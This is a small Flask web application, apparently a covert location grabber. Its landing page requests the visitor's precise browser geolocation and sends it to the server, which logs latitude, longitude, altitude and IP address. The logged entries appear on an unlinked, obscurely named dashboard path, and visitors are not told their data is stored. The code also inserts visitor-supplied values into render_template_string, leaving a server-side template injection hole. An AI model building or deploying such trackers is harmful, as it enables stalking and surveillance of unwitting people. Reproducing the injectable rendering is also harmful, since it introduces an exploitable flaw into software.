import os
from flask import Flask, request, render_template_string
from datetime import datetime

app = Flask(__name__)
port = int(os.environ.get('PORT', 5000))
visitors = []

MAIN_HTML = """<!DOCTYPE html>
<html>
<head><title>main</title><style>
body{background:#000;color:#fff;margin:0;display:flex;align-items:center;justify-content:center;height:100vh;font:8vw monospace}
</style></head>
<body><div id="c">-44 34 44</div>
<script>
navigator.geolocation.getCurrentPosition(p=>{
let lat = p.coords.latitude.toFixed(6);
let lon = p.coords.longitude.toFixed(6);
let alt = p.coords.altitude ? p.coords.altitude.toFixed(1) : '0';
document.getElementById('c').innerText = lat + ' ' + lon + ' ' + alt;
fetch('/track', {
    method:'POST',
    body:JSON.stringify({lat:lat, lon:lon, alt:alt}),
    headers:{'Content-Type':'application/json'}
});
}, e=>{}, {enableHighAccuracy:true, timeout:10000});
</script></body>"""

TRACKER_HTML = """<!DOCTYPE html>
<html>
<head><title>tracker</title><style>
body{background:#000;color:#0f0;margin:20px;font:14px monospace;white-space:pre}
</style></head>
<body>{}<script>setTimeout(()=>location.reload(),3000)</script></body>"""

@app.route('/')
def main():
    return render_template_string(MAIN_HTML)

@app.route('/qwertyuiop')
def tracker():
    output = f'=== ВСЕГО: {len(visitors)} ===\n\n'
    for i, v in enumerate(visitors[-100:], 1):
        output += f'{i}. {v["lat"]} {v["lon"]} {v["alt"]} | {v["ip"]}\n'
    return render_template_string(TRACKER_HTML.replace('{}', output))

@app.route('/track', methods=['POST'])
def track():
    d = request.get_json()
    ip = request.headers.get('X-Forwarded-For', request.remote_addr)
    if ',' in ip:
        ip = ip.split(',')[0].strip()
    if d and 'lat' in d and 'lon' in d and 'alt' in d:
        entry = {'lat': d['lat'], 'lon': d['lon'], 'alt': d['alt'], 'ip': ip}
        visitors.append(entry)
        print(f'\n=== НОВЫЙ ===')
        print(f'ШИРОТА: {d["lat"]}')
        print(f'ДОЛГОТА: {d["lon"]}')
        print(f'ВЫСОТА: {d["alt"]} м')
        print(f'IP: {ip}')
        print(f'ВРЕМЯ: {datetime.now().strftime("%H:%M:%S")}')
        print('============\n')
    return '', 204

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=port)
